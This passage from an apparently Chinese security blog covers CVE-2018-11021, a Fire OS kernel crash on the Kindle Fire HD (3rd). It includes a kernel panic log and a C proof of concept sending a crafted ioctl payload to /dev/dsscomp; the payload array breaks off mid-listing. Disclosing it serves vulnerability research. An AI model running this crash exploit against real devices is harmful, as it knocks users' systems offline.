00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  381.984008] 6580  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  381.994689] 65a0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.005340] 65c0  00000000 00000028 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.016021] 65e0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.026519] </span><br><span class="line">[  382.026519] R5: 0xc0a25ad0:</span><br><span class="line">[  382.031616] 5ad0  00010105 01010005 01040901 00040001 ffff0101 00000000 00000000 00040b03</span><br><span class="line">[  382.042175] 5af0  01040101 ffff0100 00000000 00000000 0000ffff 00000000 0e0c0000 01010005</span><br><span class="line">[  382.052856] 5b10  01000105 0000ffff 00000000 0e0c0000 01010005 00000105 01040901 00040001</span><br><span class="line">[  382.063507] 5b30  ffff0101 00000000 00000000 00040b03 01040101 3f3f0100 00010001 01000001</span><br><span class="line">[  382.074157] 5b50  00000000 00000000 00000000 c0a25b5c c0a25b5c 00000000 c0a25b64 00000000</span><br><span class="line">[  382.084716] 5b70  00000000 00000001 c0a25b78 c0a25b78 c0a25b80 c0a25b80 00000000 00000000</span><br><span class="line">[  382.095245] 5b90  00000001 c0a25b94 c0a25b94 c0a25b9c c0a25b9c 00000000 00000000 00000001</span><br><span class="line">[  382.105926] 5bb0  c0a25bb0 c0a25bb0 c0a25bb8 c0a25bb8 c0a25bc0 c0a25bc0 c0a25bc8 c0a25bc8</span><br><span class="line">[  382.116577] </span><br><span class="line">[  382.116577] R6: 0xde941f80:</span><br><span class="line">[  382.121551] 1f80  de917b80 c00635cc 00000013 de84190c de917b80 c00635cc 00000013 00000000</span><br><span class="line">[  382.132202] 1fa0  00000000 00000000 de941ff4 de941fb8 c0068af4 c00635d8 00000000 00000000</span><br><span class="line">[  382.142730] 1fc0  de917b80 00000000 00000000 00000000 de941fd0 de941fd0 00000000 de84190c</span><br><span class="line">[  382.153259] 1fe0  c0068a64 c004cd64 00000000 de941ff8 c004cd64 c0068a70 00000000 00000000</span><br><span class="line">[  382.163940] 2000  00000000 00000002 00000000 dd0bd7c0 c0a0e840 00000000 00000015 c2de6540</span><br><span class="line">[  382.174621] 2020  00000000 de942000 c09ddc50 dd0bd7c0 de83d300 c1617b40 de943ba4 de943af0</span><br><span class="line">[  382.185150] 2040  c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000</span><br><span class="line">[  382.195800] 2060  01c454c0 5ebfe27f 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.206451] </span><br><span class="line">[  382.206451] R7: 0xeddad2a7:</span><br><span class="line">[  382.211425] d2a4  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.222106] d2c4  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.232788] d2e4  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.243316] d304  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.253997] d324  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.264678] d344  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.275238] d364  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.286071] d384  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.296752] d3a4  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  382.307434] </span><br><span class="line">[  382.307434] R8: 0xc25e6518:</span><br><span class="line">[  382.312408] 6518  c2410c00 000008a8 c0a10a88 00000000 c16281fc 00000000 00000000 00000000</span><br><span class="line">[  382.323059] 6538  00000000 000003e8 c25e6000 00000093 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.333587] 6558  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.344268] 6578  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.354919] 6598  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.365600] 65b8  00000000 00000000 00000000 00000028 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.376129] 65d8  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.386779] 65f8  00000000 00000000 00000093 00000093 0000004d 00000002 00000000 00000000</span><br><span class="line">[  382.397308] </span><br><span class="line">[  382.397338] R9: 0xdd3e8c28:</span><br><span class="line">[  382.402282] 8c28  dd3e8c28 dd3e8c28 00000000 00000000 00000000 c06bc674 000200da c09dda58</span><br><span class="line">[  382.412933] 8c48  00000000 00000000 dd3e8c50 dd3e8c50 00000000 c0aa5174 c0aa5174 c0aa5148</span><br><span class="line">[  382.423614] 8c68  5aefce7f 00000000 00000000 00000000 dd3e8c80 00000000 00000000 00000000</span><br><span class="line">[  382.434112] 8c88  00200000 00000000 00000000 dd3e8c94 dd3e8c94 dd3d2380 dd3d2380 00000000</span><br><span class="line">[  382.444793] 8ca8  000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd154400</span><br><span class="line">[  382.455322] 8cc8  dd3e8d80 dd35ce70 00001064 00000001 0fb00000 5aefce7f 2cb41780 5aefce7f</span><br><span class="line">[  382.466003] 8ce8  2cb41780 5aefce7f 2cb41780 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  382.476531] 8d08  00000000 00000000 00000000 00000000 00000001 00000000 00000000 dd3e8d24</span><br><span class="line">[  382.487182] Process gcioctl_poc_2 (pid: 4073, stack limit &#x3D; 0xde9422f8)</span><br><span class="line">[  382.494689] Stack: (0xde943e58 to 0xde944000)</span><br><span class="line">[  382.499603] 3e40:                                                       00000000 be8075c8</span><br><span class="line">[  382.508819] 3e60: de943f04 de943e70 c0317704 c031712c 00000001 00000028 be8075c8 de943ea0</span><br><span class="line">[  382.517913] 3e80: de943e98 de943e90 c0207454 c00bd920 de943e90 de943e90 de943e98 de943e98</span><br><span class="line">[  382.527130] 3ea0: 00000000 00000002 00000002 eddad33f 41414141 41414141 41414141 41414141</span><br><span class="line">[  382.536346] 3ec0: 41414141 41414141 41414141 d7b96700 de943efc de943ee0 c02089fc 00000000</span><br><span class="line">[  382.545562] 3ee0: d74f9540 00000004 d74f9540 be8075c8 dd3e8ca8 00000000 de943f74 de943f08</span><br><span class="line">[  382.554656] 3f00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190</span><br><span class="line">[  382.563873] 3f20: dcf8c770 de943f0c de942000 be807638 be8075c8 c02c5d6d d74f9540 00000004</span><br><span class="line">[  382.573120] 3f40: de942000 00000000 de943f64 00000000 be8075c8 c02c5d6d d74f9540 00000004</span><br><span class="line">[  382.582183] 3f60: de942000 00000000 de943fa4 de943f78 c01365e0 c0135fc4 00000000 00000000</span><br><span class="line">[  382.591430] 3f80: 00000400 be807638 00010e64 00000000 00000036 c0013e08 00000000 de943fa8</span><br><span class="line">[  382.600646] 3fa0: c0013c60 c0136578 be807638 00010e64 00000004 c02c5d6d be8075c8 be8075c8</span><br><span class="line">[  382.609863] 3fc0: be807638 00010e64 00000000 00000036 00000000 00000000 00000000 be807624</span><br><span class="line">[  382.618927] 3fe0: 00000000 be8075ac 000106a0 0002918c 60000010 00000004 00000000 00000000</span><br><span class="line">[  382.628143] Backtrace: </span><br><span class="line">[  382.631164] [&lt;c0317120&gt;] (free_buffer+0x0&#x2F;0x13c) from [&lt;c0317704&gt;] (dev_ioctl+0x2c8&#x2F;0x10c4)</span><br><span class="line">[  382.640563]  r5:be8075c8 r4:00000000</span><br><span class="line">[  382.644958] [&lt;c031743c&gt;] (dev_ioctl+0x0&#x2F;0x10c4) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c&#x2F;0x5b4)</span><br><span class="line">[  382.654388] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0&#x2F;0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74&#x2F;0x84)</span><br><span class="line">[  382.663604] [&lt;c013656c&gt;] (sys_ioctl+0x0&#x2F;0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">[  382.673004]  r8:c0013e08 r7:00000036 r6:00000000 r5:00010e64 r4:be807638</span><br><span class="line">[  382.681304] Code: e1a02005 e5940004 e5b21014 e5853014 (e5832004) </span><br><span class="line">[  382.697326] Board Information: </span><br><span class="line">[  382.697357]  Revision : 0001</span><br><span class="line">[  382.697357]  Serial	: 0000000000000000</span><br><span class="line">[  382.697387] SoC Information:</span><br><span class="line">[  382.697387]  CPU	: OMAP4470</span><br><span class="line">[  382.697418]  Rev	: ES1.0</span><br><span class="line">[  382.697418]  Type	: HS</span><br><span class="line">[  382.697418]  Production ID: 0002B975-000000CC</span><br><span class="line">[  382.697448]  Die ID	: 1CC60000-50002FFF-0B00935D-11007004</span><br><span class="line">[  382.697448] </span><br><span class="line">[  382.733703] ---[ end trace 58e760c9cd2996a9 ]---</span><br><span class="line">[  382.739074] Kernel panic - not syncing: Fatal exception</span><br><span class="line">[  382.744964] CPU1: stopping</span><br><span class="line">[  382.748229] Backtrace: </span><br><span class="line">[  382.751251] [&lt;c0018148&gt;] (dump_backtrace+0x0&#x2F;0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18&#x2F;0x1c)</span><br><span class="line">[  382.760742]  r6:c09ddc50 r5:c09dc844 r4:00000001 r3:c0a0e950</span><br><span class="line">[  382.767761] [&lt;c0698ba0&gt;] (dump_stack+0x0&#x2F;0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190&#x2F;0x1c4)</span><br><span class="line">[  382.777008] [&lt;c0019a48&gt;] (handle_IPI+0x0&#x2F;0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58&#x2F;0x60)</span><br><span class="line">[  382.786499] [&lt;c00084a4&gt;] (gic_handle_irq+0x0&#x2F;0x60) from [&lt;c06a5380&gt;] (__irq_svc+0x40&#x2F;0x70)</span><br><span class="line">[  382.795684] Exception stack(0xde885e98 to 0xde885ee0)</span><br><span class="line">[  382.801483] 5e80:                                                       de885ee0 0000d120</span><br><span class="line">[  382.810577] 5ea0: 1ce88a9c 00000059 1cc00792 00000059 c161e498 00000000 c09ece64 de960480</span><br><span class="line">[  382.819793] 5ec0: c0ad01c8 de885f0c 0000017e de885ee0 c008e350 c0431ae0 600f0013 ffffffff</span><br><span class="line">[  382.829010]  r6:ffffffff r5:600f0013 r4:c0431ae0 r3:c008e350</span><br><span class="line">[  382.836029] [&lt;c0431a90&gt;] (cpuidle_wrap_enter+0x0&#x2F;0x9c) from [&lt;c04310c0&gt;] (cpuidle_enter_tk+0x18&#x2F;0x1c)</span><br><span class="line">[  382.846374]  r7:00000000 r6:c161e498 r5:c161e498 r4:de96048c</span><br><span class="line">[  382.853515] [&lt;c04310a8&gt;] (cpuidle_enter_tk+0x0&#x2F;0x1c) from [&lt;c04315dc&gt;] (cpuidle_enter_state+0x1c&#x2F;0x78)</span><br><span class="line">[  382.863983] [&lt;c04315c0&gt;] (cpuidle_enter_state+0x0&#x2F;0x78) from [&lt;c04334b8&gt;] (cpuidle_enter_state_coupled+0x13c&#x2F;0x36c)</span><br><span class="line">[  382.875518]  r6:de884000 r5:c161e498 r4:de96048c r3:00000000</span><br><span class="line">[  382.882659] [&lt;c043337c&gt;] (cpuidle_enter_state_coupled+0x0&#x2F;0x36c) from [&lt;c043176c&gt;] (cpuidle_idle_call+0x134&#x2F;0x31c)</span><br><span class="line">[  382.894256] [&lt;c0431638&gt;] (cpuidle_idle_call+0x0&#x2F;0x31c) from [&lt;c0015294&gt;] (cpu_idle+0xa4&#x2F;0x10c)</span><br><span class="line">[  382.903961] [&lt;c00151f0&gt;] (cpu_idle+0x0&#x2F;0x10c) from [&lt;c0695650&gt;] (secondary_start_kernel+0x118&#x2F;0x13c)</span><br><span class="line">[  382.914093] [&lt;c0695538&gt;] (secondary_start_kernel+0x0&#x2F;0x13c) from [&lt;80694ff4&gt;] (0x80694ff4)</span><br><span class="line">[  382.923400]  r6:10c0387d r5:00000015 r4:9e84c06a r3:c0694fdc</span><br><span class="line">[  382.930603] CPU0 PC (0) : 0xc003ee38</span><br><span class="line">[  382.934661] CPU0 PC (1) : 0xc003ee54</span><br><span class="line">[  382.938720] CPU0 PC (2) : 0xc003ee54</span><br><span class="line">[  382.942901] CPU0 PC (3) : 0xc003ee54</span><br><span class="line">[  382.946960] CPU0 PC (4) : 0xc003ee54</span><br><span class="line">[  382.951019] CPU0 PC (5) : 0xc003ee54</span><br><span class="line">[  382.955200] CPU0 PC (6) : 0xc003ee54</span><br><span class="line">[  382.959259] CPU0 PC (7) : 0xc003ee54</span><br><span class="line">[  382.963317] CPU0 PC (8) : 0xc003ee54</span><br><span class="line">[  382.967376] CPU0 PC (9) : 0xc003ee54</span><br><span class="line">[  382.971557] CPU1 PC (0) : 0xc0019b2c</span><br><span class="line">[  382.975616] CPU1 PC (1) : 0xc0019b2c</span><br><span class="line">[  382.979675] CPU1 PC (2) : 0xc0019b2c</span><br><span class="line">[  382.983856] CPU1 PC (3) : 0xc0019b2c</span><br><span class="line">[  382.987915] CPU1 PC (4) : 0xc0019b2c</span><br><span class="line">[  382.991973] CPU1 PC (5) : 0xc0019b2c</span><br><span class="line">[  382.996154] CPU1 PC (6) : 0xc0019b2c</span><br><span class="line">[  383.000213] CPU1 PC (7) : 0xc0019b2c</span><br><span class="line">[  383.004272] CPU1 PC (8) : 0xc0019b2c</span><br><span class="line">[  383.008453] CPU1 PC (9) : 0xc0019b2c</span><br><span class="line">[  383.012512] </span><br><span class="line">[  383.014312] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017</span><br><span class="line">[  383.014312] </span><br></pre></td></tr></table></figure></blockquote>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2020-09-12T15:12:30.000Z" title="2020-09-12T15:12:30.000Z">2020-09-12</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-09-12T15:16:26.492Z" title="2020-09-12T15:16:26.492Z">2020-09-12</time></span><span class="level-item"><a class="link-muted" href="/categories/IOT/">IOT</a></span><span class="level-item">4 minutes read (About 587 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11021%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">（CVE-2018-11021）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞</a></h1><div class="content"><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
<p>Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3内核组件中的内核模块/omap/drivers/video/omap2/dsscomp/device.c允许攻击者通过设备/ dev上ioctl的参数注入特制参数/ dsscomp与命令<strong>1118064517</strong>并导致内核崩溃。</p>
<p>要探索此漏洞，必须打开设备文件/ dev / dsscomp，并使用命令<strong>1118064517</strong>和精心设计的有效负载作为第三个参数在此设备文件上调用ioctl系统调用。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fire OS 4.5.5.3</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>poc</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is poc of Kindle Fire HD 3rd</span></span><br><span class="line"><span class="comment"> * A bug in the ioctl interface of device file /dev/dsscomp causes the system crash via IOCTL 1118064517.</span></span><br><span class="line"><span class="comment"> * Related buggy struct name is dsscomp_setup_dispc_data.</span></span><br><span class="line"><span class="comment"> * This Poc should run with permission to do ioctl on /dev/dsscomp.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">char</span> *driver = <span class="string">&quot;/dev/dsscomp&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> command = <span class="number">1118064517</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **env)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> payload[] = &#123;</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x00000003</span>,</span><br><span class="line">    <span class="number">0x5d200040</span>,</span><br><span class="line">    <span class="number">0x79900008</span>,</span><br><span class="line">    <span class="number">0x8f5928bd</span>,</span><br><span class="line">    <span class="number">0x78b02422</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0xf4c50400</span>,</span><br><span class="line">    <span class="number">0x007fffff</span>,</span><br><span class="line">    <span class="number">0x8499f562</span>,</span><br><span class="line">    <span class="number">0xffff0400</span>,</span><br><span class="line">    <span class="number">0x001b131d</span>,</span><br><span class="line">    <span class="number">0x60818210</span>,</span><br><span class="line">    <span class="number">0x00000007</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x9da9041c</span>,</span><br><span class="line">    <span class="number">0xcd980400</span>,</span><br><span class="line">    <span class="number">0x001f03f4</span>,</span><br><span class="line">    <span class="number">0x00000007</span>,</span><br><span class="line">    <span class="number">0x2a34003f</span>,</span><br><span class="line">    <span class="number">0x7c80d8f3</span>,</span><br><span class="line">    <span class="number">0x63102627</span>,</span><br><span class="line">    <span class="number">0xc73643a8</span>,</span><br><span class="line">    <span class="number">0xa28f0665</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x689e57b4</span>,</span><br><span class="line">    <span class="number">0x01ff0008</span>,</span><br><span class="line">    <span class="number">0x5e7324b1</span>,</span><br><span class="line">    <span class="number">0xae3b003f</span>,</span><br><span class="line">    <span class="number">0x0b174d86</span>,</span><br><span class="line">    <span class="number">0x00000400</span>,</span><br><span class="line">    <span class="number">0x21ffff37</span>,</span><br><span class="line">    <span class="number">0xceb367a4</span>,</span><br><span class="line">    <span class="number">0x00000040</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xec000f9e</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x000001ff</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x0000000f</span>,</span><br><span class="line">    <span class="number">0x0425c069</span>,</span><br><span class="line">    <span class="number">0x038cc3be</span>,</span><br><span class="line">    <span class="number">0x0000000f</span>,</span><br><span class="line">    <span class="number">0x00000080</span>,</span><br><span class="line">    <span class="number">0xe5790100</span>,</span><br><span class="line">    <span class="number">0x5b1bffff</span>,</span><br><span class="line">    <span class="number">0x0000d355</span>,</span><br><span class="line">    <span class="number">0x0000c685</span>,</span><br><span class="line">    <span class="number">0xa0070000</span>,</span><br><span class="line">    <span class="number">0x0010ffff</span>,</span><br><span class="line">    <span class="number">0x00a0ff00</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xff490700</span>,</span><br><span class="line">    <span class="number">0x0832ad03</span>,</span><br><span class="line">    <span class="number">0x00000006</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x81f871c0</span>,</span><br><span class="line">    <span class="number">0x738019cb</span>,</span><br><span class="line">    <span class="number">0xbf47ffff</span>,</span><br><span class="line">    <span class="number">0x00000040</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x7f190f33</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x8295769b</span>,</span><br><span class="line">    <span class="number">0x0000003f</span>,</span><br><span class="line">    <span class="number">0x869f2295</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0xd673914f</span>,</span><br><span class="line">    <span class="number">0x05055800</span>,</span><br><span class="line">    <span class="number">0xed69b7d5</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x0107ebbd</span>,</span><br><span class="line">    <span class="number">0xd214af8d</span>,</span><br><span class="line">    <span class="number">0xffff4a93</span>,</span><br><span class="line">    <span class="number">0x26450008</span>,</span><br><span class="line">    <span class="number">0x58df0000</span>,</span><br><span class="line">    <span class="number">0xd16db084</span>,</span><br><span class="line">    <span class="number">0x03ff30dd</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x209aff3b</span>,</span><br><span class="line">    <span class="number">0xe7850800</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0x30da815c</span>,</span><br><span class="line">    <span class="number">0x426f5105</span>,</span><br><span class="line">    <span class="number">0x0de109d7</span>,</span><br><span class="line">    <span class="number">0x2c1a65fc</span>,</span><br><span class="line">    <span class="number">0xfcb3d75f</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x8066be5b</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x5cf232ec</span>,</span><br><span class="line">    <span class="number">0x680d1469</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000020</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x00000400</span>,</span><br><span class="line">    <span class="number">0xd1d12be8</span>,</span><br><span class="line">    <span class="number">0x02010200</span>,</span><br><span class="line">    <span class="number">0x01ffc16f</span>,</span><br><span class="line">    <span class="number">0xf6e237e6</span>,</span><br><span class="line">    <span class="number">0x007f0000</span>,</span><br><span class="line">    <span class="number">0x01ff08f8</span>,</span><br><span class="line">    <span class="number">0x000f00f9</span>,</span><br><span class="line">    <span class="number">0xbad07695</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xbaff0000</span>,</span><br><span class="line">    <span class="number">0x24040040</span>,</span><br><span class="line">    <span class="number">0x00000006</span>,</span><br><span class="line">    <span class="number">0x00000004</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xbc2e9242</span>,</span><br><span class="line">    <span class="number">0x009f5f08</span>,</span><br><span class="line">    <span class="number">0x00800000</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xff8800ff</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x000003f4</span>,</span><br><span class="line">    <span class="number">0x6faa8472</span>,</span><br><span class="line">    <span class="number">0x00000400</span>,</span><br><span class="line">    <span class="number">0xec857dd5</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000040</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x3f004874</span>,</span><br><span class="line">    <span class="number">0x0000b77a</span>,</span><br><span class="line">    <span class="number">0xec9acb95</span>,</span><br><span class="line">    <span class="number">0xfacc0001</span>,</span><br><span class="line">    <span class="number">0xffff0001</span>,</span><br><span class="line">    <span class="number">0x0080ffff</span>,</span><br><span class="line">    <span class="number">0x3600ff03</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x8fff7d7f</span>,</span><br><span class="line">    <span class="number">0x6b87075a</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">  